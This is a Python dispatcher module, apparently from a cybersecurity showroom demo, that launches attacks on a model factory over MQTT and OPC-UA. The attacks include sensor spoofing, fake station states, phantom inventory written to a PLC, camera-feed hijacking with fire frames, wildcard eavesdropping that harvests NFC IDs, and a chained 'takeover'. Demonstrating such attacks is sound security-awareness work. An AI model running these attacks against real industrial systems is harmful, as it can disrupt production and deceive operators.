from __future__ import annotations

"""
command_executor.py — CORREGIDO
================================
Correcciones aplicadas:
1. finish_execution se llama cuando el trabajo REAL termina, no al lanzarse.
2. cancel() invoca el stopper del ataque real, no solo el monitor thread.
3. _start_bg_monitor llama finish_execution con timestamp real al salir.
4. Eavesdrop: sleep cancelable + cleanup garantizado en finally.
5. OPC-UA Monitor: cancelable via asyncio task cancellation.
6. ctrl_stop_all: cancela todos los exec_ids activos + demo.stop_all_background().
"""

import asyncio
import queue
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Optional

if getattr(sys, "frozen", False):
    _CYBER_DIR = Path(sys._MEIPASS) / "Cyber"
else:
    _CYBER_DIR = Path(__file__).resolve().parents[2] / "Cyber"
if str(_CYBER_DIR) not in sys.path:
    sys.path.insert(0, str(_CYBER_DIR))

from backend.core.config import settings
from backend.services import history_service

_log_queue: queue.Queue = queue.Queue(maxsize=2000)
_RUNNING: dict[int, dict] = {}
_RUNNING_LOCK = threading.Lock()


def push_log(level: str, message: str, exec_id: int | None = None) -> None:
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "level": level,
        "message": message,
        "exec_id": exec_id,
    }
    try:
        _log_queue.put_nowait(entry)
    except queue.Full:
        pass


def get_log_queue() -> queue.Queue:
    return _log_queue


_demo_instance: Any = None
_demo_lock = threading.Lock()


def _get_demo():
    global _demo_instance
    with _demo_lock:
        if _demo_instance is None:
            try:
                import os as _os
                if sys.stdout is None:
                    sys.stdout = open(_os.devnull, "w", encoding="utf-8", errors="replace")
                if sys.stderr is None:
                    sys.stderr = open(_os.devnull, "w", encoding="utf-8", errors="replace")
                if sys.stdin is None:
                    sys.stdin = open(_os.devnull, "r", encoding="utf-8")
                _orig_ts = _os.get_terminal_size
                def _safe_ts(*a, **kw):
                    try:
                        return _orig_ts(*a, **kw)
                    except (OSError, ValueError):
                        return _os.terminal_size((76, 24))
                _os.get_terminal_size = _safe_ts
                import demo_attack_ft as ft  # type: ignore[import]
                ft.BROKER = settings.broker
                ft.PORT = settings.broker_port
                ft.ENDPOINT = settings.plc_endpoint
                _demo_instance = ft.ShowroomDemo()
                push_log("info", f"MQTT conectado a {settings.broker}:{settings.broker_port}")
            except Exception as exc:
                push_log("error", f"No se pudo conectar al broker MQTT: {exc}")
                raise
    return _demo_instance


def _try_get_demo():
    try:
        return _get_demo()
    except Exception:
        return None


# ── Registry ─────────────────────────────────────────────────────────

def _register_bg(
    exec_id: int,
    thread: threading.Thread,
    stop_event: threading.Event,
    stopper: Optional[Callable] = None,
) -> None:
    """stopper = callable que detiene el ataque REAL (no solo el hilo monitor)."""
    with _RUNNING_LOCK:
        _RUNNING[exec_id] = {"thread": thread, "stop_event": stop_event, "stopper": stopper}


def _unregister_bg(exec_id: int) -> None:
    with _RUNNING_LOCK:
        _RUNNING.pop(exec_id, None)


def cancel(exec_id: int) -> bool:
    """
    Cancela una operacion background:
    1. Llama stopper() para detener el trabajo real del ataque.
    2. Activa stop_event para que el hilo monitor salga.
    El monitor llama finish_execution con la duracion real al salir.
    """
    with _RUNNING_LOCK:
        entry = _RUNNING.get(exec_id)
    if not entry:
        return False
    stopper = entry.get("stopper")
    if stopper:
        try:
            stopper()
        except Exception as e:
            push_log("warn", f"cancel stopper error [{exec_id}]: {e}")
    stop_ev = entry.get("stop_event")
    if stop_ev:
        stop_ev.set()
    return True


def _start_bg_monitor(
    exec_id: int,
    label: str,
    is_running_fn: Callable[[], bool],
    stopper: Optional[Callable] = None,
) -> None:
    """
    Vigila is_running_fn(). Cuando el ataque real termina o es cancelado:
    - Llama _unregister_bg
    - Llama finish_execution con el timestamp real de finalizacion

    IMPORTANTE: finish_execution NO debe llamarse antes de esta funcion
    para comandos background. Este monitor es el unico que lo llama.
    """
    stop_ev = threading.Event()

    def _monitor():
        try:
            while is_running_fn() and not stop_ev.is_set():
                time.sleep(0.4)
        finally:
            _unregister_bg(exec_id)
            history_service.finish_execution(exec_id, "success")
            push_log("info", f"[#{exec_id}] {label} finalizado.", exec_id)

    t = threading.Thread(target=_monitor, daemon=True, name=f"bg-monitor-{exec_id}")
    _register_bg(exec_id, t, stop_ev, stopper=stopper)
    t.start()


# ── Main dispatcher ──────────────────────────────────────────────────

def execute(command_id: str, params: dict, username: str, exec_id: int) -> dict:
    handlers = {
        "mqtt_order_red":         _mqtt_order_red,
        "mqtt_order_blue":        _mqtt_order_blue,
        "mqtt_order_white":       _mqtt_order_white,
        "mqtt_ptu_dance":         _mqtt_ptu_dance,
        "mqtt_sensor_spoof":      _mqtt_sensor_spoof,
        "mqtt_sensor_alarm":      _mqtt_sensor_alarm,
        "mqtt_chaos_busy":        _mqtt_chaos_busy,
        "mqtt_ghost_stock":       _mqtt_ghost_stock,
        "mqtt_reset_state":       _mqtt_reset_state,
        "mqtt_fire_loop":         _mqtt_fire_loop,
        "mqtt_freeze_frame":      _mqtt_freeze_frame,
        "mqtt_eavesdrop":         _mqtt_eavesdrop,
        "mqtt_takeover":          _mqtt_takeover,
        "opcua_discover":         _opcua_discover,
        "opcua_browse":           _opcua_browse,
        "opcua_read":             _opcua_read,
        "opcua_inspect":          _opcua_inspect,
        "opcua_ghost_real":       _opcua_ghost_real,
        "opcua_save_snapshot":    _opcua_save_snapshot,
        "opcua_restore_snapshot": _opcua_restore_snapshot,
        "opcua_trigger_park":     _opcua_trigger_park,
        "opcua_monitor":          _opcua_monitor,
        "ctrl_stop_all":          _ctrl_stop_all,
    }
    fn = handlers.get(command_id)
    if fn is None:
        history_service.finish_execution(exec_id, "error", error=f"Unknown: {command_id}")
        return {"ok": False, "error": f"Unknown command: {command_id}"}
    try:
        result = fn(params, exec_id)
        return result or {"ok": True}
    except Exception as exc:
        msg = f"{type(exc).__name__}: {exc}"
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def get_active_operations() -> list[dict]:
    with _RUNNING_LOCK:
        return [{"exec_id": eid} for eid in _RUNNING.keys()]


# ── MQTT L1 ──────────────────────────────────────────────────────────

def _mqtt_order_red(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    push_log("info", "Publicando orden RED -> f/o/order", exec_id)
    demo.order("RED")
    push_log("success", "Orden RED publicada.", exec_id)
    history_service.finish_execution(exec_id, "success", result={"color": "RED"})
    return {"ok": True, "message": "Orden RED enviada al bus MQTT."}


def _mqtt_order_blue(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    push_log("info", "Publicando orden BLUE -> f/o/order", exec_id)
    demo.order("BLUE")
    push_log("success", "Orden BLUE publicada.", exec_id)
    history_service.finish_execution(exec_id, "success", result={"color": "BLUE"})
    return {"ok": True, "message": "Orden BLUE enviada al bus MQTT."}


def _mqtt_order_white(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    push_log("info", "Publicando orden WHITE -> f/o/order", exec_id)
    demo.order("WHITE")
    push_log("success", "Orden WHITE publicada.", exec_id)
    history_service.finish_execution(exec_id, "success", result={"color": "WHITE"})
    return {"ok": True, "message": "Orden WHITE enviada al bus MQTT."}


def _mqtt_ptu_dance(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}

    def run():
        try:
            push_log("info", "PTU Dance: iniciando secuencia de misdirection", exec_id)
            demo.ptu_dance()
            push_log("success", "PTU Dance completo.", exec_id)
            history_service.finish_execution(exec_id, "success")
        except Exception as e:
            push_log("error", str(e), exec_id)
            history_service.finish_execution(exec_id, "error", error=str(e))
        finally:
            _unregister_bg(exec_id)

    stop_ev = threading.Event()
    t = threading.Thread(target=run, daemon=True)
    _register_bg(exec_id, t, stop_ev)
    t.start()
    return {"ok": True, "message": "PTU Dance iniciado en background.", "exec_id": exec_id}


# ── MQTT L3 ──────────────────────────────────────────────────────────

def _mqtt_sensor_spoof(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.start_fake_sensor()
    push_log("warn", "Sensor spoof iniciado: 22.5C nominal loop -> i/bme680", exec_id)
    # finish_execution lo llamara el monitor cuando el ataque REALMENTE termine
    _start_bg_monitor(
        exec_id, "sensor_spoof",
        is_running_fn=lambda: demo.fake_sensor_running,
        stopper=demo.stop_fake_sensor,
    )
    return {"ok": True, "message": "Sensor spoof activo (22.5C). Use Stop All para detener."}


def _mqtt_sensor_alarm(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.dramatic_sensor()
    push_log("warn", "Sensor ALARM iniciado: 87.3C critico loop -> i/bme680", exec_id)
    _start_bg_monitor(
        exec_id, "sensor_alarm",
        is_running_fn=lambda: demo.fake_sensor_running,
        stopper=demo.stop_fake_sensor,
    )
    return {"ok": True, "message": "Sensor alarm activo (87.3C). Use Stop All para detener."}


# ── MQTT L4 ──────────────────────────────────────────────────────────

def _mqtt_chaos_busy(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.chaos_busy()
    push_log("warn", "Chaos busy iniciado: HBW/VGR/MPO/SLD BUSY en loop", exec_id)
    _start_bg_monitor(
        exec_id, "chaos_busy",
        is_running_fn=lambda: "chaos busy" in demo._active_injections(),
        stopper=lambda: demo.stop_state_inject("chaos busy"),
    )
    return {"ok": True, "message": "Chaos busy activo. Use Stop All para detener."}


def _mqtt_ghost_stock(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.ghost_stock()
    push_log("warn", "Ghost stock iniciado: 9 piezas fantasma en f/i/stock", exec_id)
    _start_bg_monitor(
        exec_id, "ghost_stock",
        is_running_fn=lambda: "ghost stock" in demo._active_injections(),
        stopper=lambda: demo.stop_state_inject("ghost stock"),
    )
    return {"ok": True, "message": "Ghost stock activo. Use Stop All para detener."}


def _mqtt_reset_state(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.reset_state()
    push_log("info", "Reset state: todas las estaciones -> IDLE", exec_id)
    history_service.finish_execution(exec_id, "success")
    return {"ok": True, "message": "Estado reseteado. PLC republicara en el proximo latido."}


# ── MQTT L5 ──────────────────────────────────────────────────────────

def _mqtt_fire_loop(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    try:
        import cv2 as _cv2
        push_log("info", f"cv2 {_cv2.__version__} disponible", exec_id)
    except ImportError as e:
        msg = f"opencv no disponible: {e}"
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}
    if getattr(sys, "frozen", False):
        _img_dir = Path(sys._MEIPASS) / "Cyber" / "image"
    else:
        _img_dir = _CYBER_DIR / "image"
    push_log("info", f"img_dir: {_img_dir} exists={_img_dir.exists()}", exec_id)
    demo.start_cam_fire(announce=False)
    if not demo.cam_hijack_running:
        msg = "Fire loop no iniciado. Revisar logs de diagnostico."
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}
    push_log("warn", "Fire loop activo: frames de incendio -> i/cam @ 10fps", exec_id)
    _start_bg_monitor(
        exec_id, "fire_loop",
        is_running_fn=lambda: demo.cam_hijack_running,
        stopper=demo.stop_cam_hijack,
    )
    return {"ok": True, "message": "Fire loop activo. Use Stop All para detener."}


def _mqtt_freeze_frame(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    demo.start_cam_freeze()
    if not demo.cam_hijack_running:
        msg = "Freeze frame no iniciado. Verifica opencv y Cyber/image/*.png."
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}
    push_log("warn", "Freeze frame activo: frame congelado en loop -> i/cam", exec_id)
    _start_bg_monitor(
        exec_id, "freeze_frame",
        is_running_fn=lambda: demo.cam_hijack_running,
        stopper=demo.stop_cam_hijack,
    )
    return {"ok": True, "message": "Freeze frame activo. Use Stop All para detener."}


# ── MQTT L6 ──────────────────────────────────────────────────────────

def _mqtt_eavesdrop(params, exec_id):
    """
    Eavesdrop con sleep cancelable y cleanup garantizado.
    - Usa time.sleep(0.25) en bucle verificando stop_ev para poder cancelar.
    - Llama unsubscribe + message_callback_remove en el finally para no dejar
      listeners huerfanos en el cliente MQTT compartido.
    - No usa el cliente para publicar, solo suscribe (pasivo).
    """
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}
    seconds = int(params.get("seconds", 12))
    results = {"topics": {}, "nfc_ids": [], "orders": []}
    stop_ev = threading.Event()

    def run():
        import re as _re
        received = []
        subscribed = False
        try:
            push_log("info", f"Eavesdrop: sniffing {seconds}s en wildcard #", exec_id)

            def on_msg(c, u, m):
                try:
                    payload = m.payload.decode("utf-8", errors="replace")
                except Exception:
                    payload = "<binary>"
                received.append((m.topic, payload))
                results["topics"][m.topic] = results["topics"].get(m.topic, 0) + 1
                for match in _re.finditer(r'"id"\s*:\s*"([^"]+)"', payload):
                    if match.group(1) not in results["nfc_ids"]:
                        results["nfc_ids"].append(match.group(1))
                for match in _re.finditer(r'"type"\s*:\s*"(RED|BLUE|WHITE)"', payload):
                    if match.group(1) not in results["orders"]:
                        results["orders"].append(match.group(1))
                push_log("info", f"[{m.topic}] {payload[:80]}", exec_id)

            demo.client.message_callback_add("#", on_msg)
            demo.client.subscribe("#", qos=0)
            subscribed = True

            # Sleep cancelable: verifica stop_ev cada 250ms
            deadline = time.monotonic() + seconds
            while time.monotonic() < deadline and not stop_ev.is_set():
                time.sleep(0.25)

            summary = (
                f"Eavesdrop completo: {len(received)} msgs, "
                f"{len(results['topics'])} topics, "
                f"NFC: {results['nfc_ids'][:5]}"
            )
            push_log("success", summary, exec_id)
            history_service.finish_execution(exec_id, "success", result=results)
        except Exception as e:
            push_log("error", str(e), exec_id)
            history_service.finish_execution(exec_id, "error", error=str(e))
        finally:
            # Cleanup garantizado: nunca dejar listener huerfano en el cliente compartido
            if subscribed:
                try:
                    demo.client.unsubscribe("#")
                except Exception:
                    pass
                try:
                    demo.client.message_callback_remove("#")
                except Exception:
                    pass
            _unregister_bg(exec_id)

    t = threading.Thread(target=run, daemon=True)
    _register_bg(exec_id, t, stop_ev, stopper=stop_ev.set)
    t.start()
    return {"ok": True, "message": f"Eavesdrop iniciado ({seconds}s).", "exec_id": exec_id}


def _mqtt_takeover(params, exec_id):
    demo = _try_get_demo()
    if not demo:
        history_service.finish_execution(exec_id, "error", error="Broker MQTT no disponible")
        return {"ok": False, "error": "Broker MQTT no disponible"}

    def run():
        try:
            push_log("warn", "TAKEOVER: iniciando 5 ataques encadenados", exec_id)
            steps = [
                ("Chaos busy",   demo.chaos_busy),
                ("Sensor alarm", demo.dramatic_sensor),
                ("Ghost stock",  demo.ghost_stock),
                ("PTU dance",    demo.ptu_dance),
                ("Fire loop",    lambda: demo.start_cam_fire(announce=False)),
            ]
            threads = [threading.Thread(target=fn, daemon=True) for _, fn in steps]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            push_log("warn", "TAKEOVER completo: planta comprometida al 100%", exec_id)
            history_service.finish_execution(exec_id, "success")
        except Exception as e:
            push_log("error", str(e), exec_id)
            history_service.finish_execution(exec_id, "error", error=str(e))
        finally:
            _unregister_bg(exec_id)

    stop_ev = threading.Event()
    t = threading.Thread(target=run, daemon=True)
    _register_bg(exec_id, t, stop_ev)
    t.start()
    return {"ok": True, "message": "Takeover iniciado en background.", "exec_id": exec_id}


# ── OPC-UA helpers ───────────────────────────────────────────────────

def _run_async(coro):
    """Ejecuta una corrutina asyncio en un event loop nuevo (desde un hilo sync)."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ── OPC-UA foreground commands ───────────────────────────────────────

def _opcua_discover(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        max_depth = int(params.get("max_depth", 6))
        push_log("info", f"OPC-UA Discover: depth={max_depth} -> {settings.plc_endpoint}", exec_id)
        _run_async(ft.cmd_discover(max_depth))
        push_log("success", "Discover completo.", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Discover completado. Ver logs para resultados."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_browse(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("info", f"OPC-UA Browse -> {settings.plc_endpoint}", exec_id)
        _run_async(ft.cmd_browse())
        push_log("success", "Browse completo.", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Browse completado. Ver logs."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_read(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("info", "OPC-UA Read Plant Snapshot", exec_id)
        _run_async(ft.cmd_read())
        push_log("success", "Snapshot leido.", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Snapshot completo. Ver logs."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_inspect(params, exec_id):
    target = params.get("target", "gtyp_HBW.Rack_Workpiece")
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("info", f"OPC-UA Inspect: {target}", exec_id)
        _run_async(ft.cmd_inspect(target))
        push_log("success", f"Inspect de {target} completo.", exec_id)
        history_service.finish_execution(exec_id, "success", result={"target": target})
        return {"ok": True, "message": f"Inspect de '{target}' completado. Ver logs."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_ghost_real(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("warn", "OPC-UA Ghost Real: sobreescribiendo Rack_Workpiece con 9 piezas fantasma", exec_id)
        _run_async(ft.cmd_ghost("real"))
        push_log("warn", "Ghost real completo. HMI oficial afectado.", exec_id)
        history_service.finish_execution(exec_id, "success", result={"phantom_pieces": 9})
        return {"ok": True, "message": "9 piezas fantasma escritas en el PLC."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_save_snapshot(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("info", "OPC-UA Save Snapshot: guardando inventario real", exec_id)
        _run_async(ft.cmd_ghost("snapshot"))
        push_log("success", "Snapshot guardado en inventory_backup.json", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Snapshot guardado."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_restore_snapshot(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("warn", "OPC-UA Restore Snapshot: restaurando inventario original", exec_id)
        _run_async(ft.cmd_ghost("restore"))
        push_log("success", "Inventario restaurado en el PLC.", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Inventario restaurado desde snapshot."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_trigger_park(params, exec_id):
    try:
        import demo_attack_ft as ft  # type: ignore[import]
        push_log("warn", "OPC-UA Trigger Park: enviando estaciones a parking", exec_id)
        _run_async(ft.cmd_alert("park"))
        push_log("success", "Trigger park completado. Estaciones en movimiento.", exec_id)
        history_service.finish_execution(exec_id, "success")
        return {"ok": True, "message": "Todas las estaciones enviadas a parking."}
    except Exception as e:
        msg = str(e)
        push_log("error", msg, exec_id)
        history_service.finish_execution(exec_id, "error", error=msg)
        return {"ok": False, "error": msg}


def _opcua_monitor(params, exec_id):
    """
    OPC-UA Monitor cancelable via asyncio task cancellation.

    Cuando se llama cancel(exec_id):
    1. stop_ev.set() activa el watcher asyncio interno.
    2. El watcher cancela la tarea cmd_monitor.
    3. asyncio.CancelledError se lanza en asyncio.sleep(duration_s).
    4. El finally de cmd_monitor llama subscription.delete() + client.disconnect().
    5. El hilo run() completa, llama finish_execution con duracion real.
    """
    duration = int(params.get("duration", 60))
    try:
        import demo_attack_ft as ft  # type: ignore[import]
    except Exception as e:
        history_service.finish_execution(exec_id, "error", error=str(e))
        return {"ok": False, "error": str(e)}

    stop_ev = threading.Event()

    def run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def _monitor_with_cancel():
            monitor_task = asyncio.ensure_future(ft.cmd_monitor(duration))

            async def _watcher():
                # Polling externo: verifica stop_ev cada 0.3s
                while not stop_ev.is_set():
                    await asyncio.sleep(0.3)
                # Cancelar la tarea del monitor; su finally limpia la suscripcion OPC-UA
                if not monitor_task.done():
                    monitor_task.cancel()

            watcher_task = asyncio.ensure_future(_watcher())
            try:
                await monitor_task
            except asyncio.CancelledError:
                push_log("info", f"OPC-UA Monitor cancelado (exec_id={exec_id}).", exec_id)
            finally:
                watcher_task.cancel()
                try:
                    await watcher_task
                except asyncio.CancelledError:
                    pass

        try:
            push_log("info", f"OPC-UA Monitor: suscripcion a ~40 variables por {duration}s", exec_id)
            loop.run_until_complete(_monitor_with_cancel())
            push_log("success", f"Monitor OPC-UA finalizado ({duration}s).", exec_id)
            history_service.finish_execution(exec_id, "success")
        except Exception as e:
            push_log("error", str(e), exec_id)
            history_service.finish_execution(exec_id, "error", error=str(e))
        finally:
            loop.close()
            _unregister_bg(exec_id)

    t = threading.Thread(target=run, daemon=True)
    _register_bg(exec_id, t, stop_ev, stopper=stop_ev.set)
    t.start()
    return {"ok": True, "message": f"Monitor OPC-UA iniciado ({duration}s).", "exec_id": exec_id}


# ── CONTROL ──────────────────────────────────────────────────────────

def _ctrl_stop_all(params, exec_id):
    """
    Parada global idempotente y verificable:
    1. Cancela todos los exec_ids activos en _RUNNING (invoca sus stoppers).
    2. Llama demo.stop_all_background() como capa de seguridad adicional.
    3. Registra finish_execution para esta propia operacion.

    El paso 1 garantiza que todos los ataques sean detenidos aunque alguno
    no este registrado correctamente en _RUNNING.
    """
    # Capturar todos los exec_ids activos excepto el propio
    with _RUNNING_LOCK:
        running_ids = [eid for eid in list(_RUNNING.keys()) if eid != exec_id]

    cancelled_count = 0
    for eid in running_ids:
        if cancel(eid):
            cancelled_count += 1
            push_log("info", f"Stop All: cancelado exec_id={eid}", exec_id)

    # Capa de seguridad: detener el demo directamente
    demo = _try_get_demo()
    if demo:
        demo.stop_all_background()
        push_log("info", f"Stop All: demo.stop_all_background() ejecutado. "
                         f"Cancelados: {cancelled_count} operaciones.", exec_id)
    else:
        push_log("info", f"Stop All: sin demo activo. Cancelados: {cancelled_count}.", exec_id)

    history_service.finish_execution(exec_id, "success",
                                     result={"cancelled": cancelled_count})
    return {
        "ok": True,
        "message": f"Stop All ejecutado. {cancelled_count} operacion(es) detenida(s).",
        "cancelled": cancelled_count,
    }
